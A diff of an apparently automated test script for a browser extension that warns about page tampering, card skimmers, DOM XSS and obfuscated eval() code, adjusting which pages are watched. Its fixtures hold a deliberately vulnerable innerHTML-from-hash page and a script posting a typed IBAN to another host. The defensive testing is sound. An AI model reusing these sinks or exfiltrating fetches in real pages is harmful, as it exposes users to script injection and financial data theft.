@@ -9,7 +9,9 @@
 //   • level 2, an ordinary page with the same replacement: no window;
 //   • level 2, a card number sent to another site (skimmer): a critical warning without countdown (tgCardSent);
 //   • "Always ignore on this site" adds "Tamper: site" to the allow list: the same page again opens no window;
-//   • level 4 ("Always watch"): an ordinary page is watched closely from the start — edited data warns there too;
+//   • owner 2026-11-24 — only the four ticks start the close watching: level 4 no longer watches an ordinary page
+//     (its edited data: no window), a DOM-XSS page no tick applies to gets no window, the same page with a checkout
+//     word does;
 //   • 5.1.2, level 2: on a /checkout address (watched from the start, 5.1.1) a card number typed into a field with an
 //     ordinary name is sent in an IMAGE address to another site → tgCardSent (Luhn value + address setter); a page
 //     with its own card-number field next to a payment provider's frame → tgSecondCardForm; a payment page that loads
@@ -96,6 +98,11 @@ function hiddenPage(fields) {
     <script>${JSON_EDIT}</script>`;
 }
 
+// A page that copies its own address (#…) into innerHTML (DOM XSS), and one that runs packed code through eval().
+const DOM_PAGE = `<!doctype html><title>dom</title><div id="out"></div>
+      <script>document.getElementById("out").innerHTML = decodeURIComponent(location.hash.slice(1));</script>`;
+const PACKED_PAGE = `<!doctype html><title>packed</title><p>packed<script>window.runPacked = () => { try { eval(${JSON.stringify(PACKED)}); } catch {} };</script>`;
+
 function buildPages(port) {
   const other = (path) => `http://${HOST_B}:${port}${path}`;
   return Object.freeze({
@@ -112,15 +119,16 @@ function buildPages(port) {
     "/checkout/script": `<!doctype html><title>pay</title>${CARD_FORM}<script src="http://${HOST_FAKE_CDN}:${port}/jquery.min.js"></script>`,
     // 5.1.2 XSS: a link to another site's page with script code in its address; a page that copies its hash into innerHTML.
     "/xss-link": `<!doctype html><title>links</title><a id="go" href="http://${HOST_A}:${port}/search?q=${encodeURIComponent(XSS_PAYLOAD)}">result</a>`,
-    "/dom": `<!doctype html><title>dom</title><div id="out"></div>
-      <script>document.getElementById("out").innerHTML = decodeURIComponent(location.hash.slice(1));</script>`,
+    "/dom": DOM_PAGE,
+    "/checkout/dom": DOM_PAGE,                      // owner 2026-11-24: the same page where a tick applies (checkout word)
     // 5.1.3: an IBAN typed into a bank-account field is sent to another site.
     "/iban": `<!doctype html><title>transfer</title><form onsubmit="return false"><input id="iban" name="iban">
       <button id="send">Send</button></form>
       <script>document.getElementById("send").onclick = () => fetch(${JSON.stringify(other("/i"))},
         { method: "POST", mode: "no-cors", body: "a=" + encodeURIComponent(document.getElementById("iban").value) }).catch(() => {});</script>`,
     // 5.1.3: a page that runs packed (obfuscated) code through eval().
-    "/packed": `<!doctype html><title>packed</title><p>packed<script>window.runPacked = () => { try { eval(${JSON.stringify(PACKED)}); } catch {} };</script>`,
+    "/packed": PACKED_PAGE,
+    "/checkout/packed": PACKED_PAGE,
     // 5.1.3: the card number leaves as HTML TEXT (an <img> written with innerHTML) — caught by the resource watcher.
     // window.f0 = fetch as the page first saw it: the outgoing check must not wrap fetch before something was typed.
     "/checkout/html": `<!doctype html><title>pay</title><script>window.f0 = window.fetch;</script>${CARD_FORM}<div id="out"></div>
@@ -390,10 +398,16 @@ try {
   await pg.close();
 
   // ── 5.1.2 DOM XSS (Tamper): the page copies script code from its own address into innerHTML ──
-  warnP = nextWarning();
+  warnP = nextWarning(NO_WINDOW_WAIT_MS);
   pg = await open(HOST_A, `/dom#${encodeURIComponent(XSS_PAYLOAD)}`);
   w = await warnP;
-  ok("5.1.2: a page putting script code from its address into innerHTML: warning (tgAddressScript)",
+  ok("owner 2026-11-24: the same on a page no tick applies to: not watched, no window", !w);
+  if (w) await click(w, "btnIgnore");
+  await pg.close();
+  warnP = nextWarning();
+  pg = await open(HOST_A, `/checkout/dom#${encodeURIComponent(XSS_PAYLOAD)}`);
+  w = await warnP;
+  ok("5.1.2: a watched page putting script code from its address into innerHTML: warning (tgAddressScript)",
      !!w && (await signalsOf(w)).includes(ruleLabel(T.ADDRESS_SCRIPT)), { list: w && await signalsOf(w).catch(() => null) });
   if (w) {
     ok("…naming where it was put", (await signalsOf(w)).includes("innerHTML"));
@@ -401,7 +415,7 @@ try {
   }
   await pg.close();
   warnP = nextWarning(NO_WINDOW_WAIT_MS);
-  pg = await open(HOST_A, "/dom#hello-world");
+  pg = await open(HOST_A, "/checkout/dom#hello-world");
   w = await warnP;
   ok("…the same page with a harmless address: no window", !w);
   await pg.close();
@@ -426,7 +440,7 @@ try {
     await pg.close();
   }
 
-  // ── level 4: an ordinary page is watched closely from the start ──
+  // ── level 4: an ordinary page is NOT watched (owner 2026-11-24: only the four ticks) ──
   // 5.1.3: from here on no case needs Scam protection, and at level 4 its suspicious-site warning takes over the
   // made-up test hosts' navigation — so the whole Scam protection is off (its warning has no switch of its own).
   await send({ type: M.MSG_SET_PROTECTION, key: P.PROTECTION_KEY.ENABLE_SCAM_PROTECTION, enabled: false });
@@ -434,21 +448,21 @@ try {
   await sleep(APPLY_SETTLE_MS);
   pg = await open(HOST_B, "/article");
   await sleep(ARM_SETTLE_MS);
-  warnP = nextWarning();
+  warnP = nextWarning(NO_WINDOW_WAIT_MS);
   await pg.evaluate(() => window.doParse());
   w = await warnP;
-  ok("level 4, ordinary page: edited data warns (watched from the start)", !!w && (await signalsOf(w)).includes(ruleLabel(T.DATA_EDITED)),
+  ok("owner 2026-11-24: level 4 no longer watches every page — an ordinary page's edited data: no window", !w,
      { list: w && await signalsOf(w).catch(() => null) });
   if (w) await click(w, "btnIgnore");
   await pg.close();
 
   // ── 5.1.3, level 4: obfuscated code stopped by blockObfuscatedEval is a signal (Suspicious warns at level 4) ──
-  pg = await open(HOST_B, "/packed");
+  pg = await open(HOST_B, "/checkout/packed");
   await sleep(ARM_SETTLE_MS);
   warnP = nextWarning();
   await pg.evaluate(() => window.runPacked());
   w = await warnP;
-  ok("5.1.3, level 4: packed code through eval() is stopped and reported (tgObfuscatedCode)",
+  ok("5.1.3, level 4, watched page: packed code through eval() is stopped and reported (tgObfuscatedCode)",
      !!w && (await signalsOf(w)).includes(ruleLabel(T.OBFUSCATED_CODE)) && (await signalsOf(w)).includes("eval") &&
      (await w.textContent("#tgRating")) === ratingLabel(C.TAMPER_RATING.SUSPICIOUS), { list: w && await signalsOf(w).catch(() => null) });
   if (w) await click(w, "btnIgnore");
